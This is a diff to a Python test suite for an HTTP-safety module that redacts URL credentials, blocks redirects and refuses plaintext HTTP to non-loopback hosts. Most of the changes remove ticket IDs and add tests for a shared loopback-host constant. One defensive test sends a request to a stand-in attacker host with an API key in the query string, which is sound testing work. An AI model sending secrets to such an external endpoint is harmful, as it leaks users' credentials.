@@ -37,7 +37,7 @@ from voice_typer.server._http_safety import (
 )
 
 # ---------------------------------------------------------------------------
-# DE-64: HTTPError.url is redacted
+# HTTPError.url is redacted
 # ---------------------------------------------------------------------------
 
 
@@ -61,7 +61,7 @@ class TestNoRedirectHandlerRedactsUrl:
                 newurl=newurl,
             )
         err = exc_info.value
-        # DE-64: the .url attribute must NOT contain the raw credentials.
+        # the .url attribute must NOT contain the raw credentials.
         assert "alice:secret" not in err.url
         # The host + scheme + path must be preserved (redact_url only
         # strips userinfo).
@@ -119,7 +119,7 @@ class TestNoRedirectHandlerRedactsUrl:
 
 
 # ---------------------------------------------------------------------------
-# DE-65: build_secure_opener refuses plaintext HTTP for non-loopback
+# build_secure_opener refuses plaintext HTTP for non-loopback
 # ---------------------------------------------------------------------------
 
 
@@ -174,7 +174,7 @@ class TestHttpsOnlyHTTPHandler:
         req = Request("http://attacker.example.com/steal?api_key=abc")
         with pytest.raises(URLError) as exc_info:
             handler.http_open(req)
-        # The error message must mention DE-65 and the host.
+        # The error message must mention  and the host.
         msg = str(exc_info.value)
         assert "DE-65" in msg
         assert "attacker.example.com" in msg
@@ -277,11 +277,11 @@ class TestHttpsOnlyHTTPHandler:
 
 
 # ---------------------------------------------------------------------------
-# YJ-26: no ``# type: ignore[override]`` suppression on urllib overrides
+# no ``# type: ignore[override]`` suppression on urllib overrides
 # ---------------------------------------------------------------------------
 
 
-class TestYJ26NoOverrideSuppression:
+class TestNoOverrideSuppression:
     """YJ-26: ``_NoRedirectHandler.redirect_request`` and
     ``_HttpsOnlyHTTPHandler.http_open`` must NOT carry a
     ``# type: ignore[override]`` suppression marker. The overrides are
@@ -372,3 +372,72 @@ class TestYJ26NoOverrideSuppression:
         from urllib.request import Request as UrllibRequest
 
         assert hints["req"] is UrllibRequest
+
+
+# ---------------------------------------------------------------------------
+# _LOOPBACK_HOSTS imported from canonical _paths.LOOPBACK_HOSTS
+# ---------------------------------------------------------------------------
+
+
+class TestLoopbackHostsIsDRY:
+    """FR-35: ``_HttpsOnlyHTTPHandler._LOOPBACK_HOSTS`` must be
+    imported from the canonical source of truth
+    (``voice_typer.server._paths.LOOPBACK_HOSTS``) rather than
+    re-declared inline. Pre-fix, the class body contained a separate
+    ``frozenset({"localhost", "127.0.0.1", "::1"})`` literal — a DRY
+    violation: if the canonical set ever changes, two files would
+    need to be edited in sync, and drift would silently either
+    over-block (breaking local dev servers like Ollama / vLLM) or
+    under-block (SSRF surface).
+
+    The class-attribute name ``_LOOPBACK_HOSTS`` is preserved for
+    backward compatibility with the existing
+    ``test_loopback_set_is_documented`` assertion (line ~276 above).
+    """
+
+    def test_loopback_hosts_value_matches_canonical(self):
+        """The class attribute's VALUE must equal the canonical
+        constant from ``_paths``."""
+        from voice_typer.server._http_safety import _HttpsOnlyHTTPHandler
+        from voice_typer.server._paths import LOOPBACK_HOSTS
+
+        assert _HttpsOnlyHTTPHandler._LOOPBACK_HOSTS == LOOPBACK_HOSTS, (
+            "FR-35 regression: _HttpsOnlyHTTPHandler._LOOPBACK_HOSTS does not "
+            "match the canonical _paths.LOOPBACK_HOSTS — the two definitions "
+            "have drifted, which means a future change to the canonical set "
+            "won't propagate to the HTTP-safety gate."
+        )
+
+    def test_loopback_hosts_source_not_hardcoded_literal(self):
+        """The source of ``_http_safety.py`` must NOT contain a
+        hardcoded ``frozenset({...})`` literal inside the
+        ``_HttpsOnlyHTTPHandler`` class body — the value must come
+        from the imported ``LOOPBACK_HOSTS`` constant."""
+        import inspect
+
+        from voice_typer.server._http_safety import _HttpsOnlyHTTPHandler
+
+        src = inspect.getsource(_HttpsOnlyHTTPHandler)
+        # The class body must NOT re-declare the literal set.
+        # We look for the specific DRY-violation pattern that was
+        # present pre-fix: a frozenset literal containing the three
+        # loopback hosts as the class-attribute assignment.
+        assert 'frozenset({"localhost", "127.0.0.1", "::1"})' not in src, (
+            "FR-35 regression: _HttpsOnlyHTTPHandler class body re-declares "
+            "the loopback set as an inline frozenset literal. Import "
+            "LOOPBACK_HOSTS from voice_typer.server._paths instead."
+        )
+
+    def test_loopback_hosts_imported_from_paths(self):
+        """The ``_http_safety`` module must import ``LOOPBACK_HOSTS``
+        from ``voice_typer.server._paths`` (so the parity is enforced
+        at import time, not just by value)."""
+        import inspect
+
+        from voice_typer.server import _http_safety
+
+        src = inspect.getsource(_http_safety)
+        assert "from voice_typer.server._paths import LOOPBACK_HOSTS" in src, (
+            "FR-35 regression: _http_safety.py does not import LOOPBACK_HOSTS "
+            "from voice_typer.server._paths — the DRY violation is back."
+        )
